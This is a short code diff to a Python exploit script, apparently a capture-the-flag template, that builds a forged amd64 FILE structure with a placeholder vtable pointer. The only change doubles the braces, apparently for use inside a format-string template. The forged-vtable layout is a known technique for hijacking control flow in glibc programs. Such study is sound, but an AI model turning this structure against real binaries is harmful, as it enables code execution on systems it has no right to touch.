@@ -56,7 +56,7 @@ def show():
 # ------------------------------------------------------------------------
 def exploit(*args, **kwargs):
     f = IOFilePlus("amd64")
-    ff = {
+    ff = {{
         "_flags":        0xfbad0000,          # 0x00
         "_IO_read_ptr":  0,                   # 0x08
         "_IO_read_end":  0,                   # 0x10
@@ -87,7 +87,7 @@ def exploit(*args, **kwargs):
         "_mode":         0,                   # 0xc0
         "_unused2":      b"\x00"*0x14,        # 0xc4
         "vtable":        0xdeadbeefcafebabe,  # 0xd8
-    }
+    }}
     f.load(ff, strict=True)
     blob = f.bytes
    
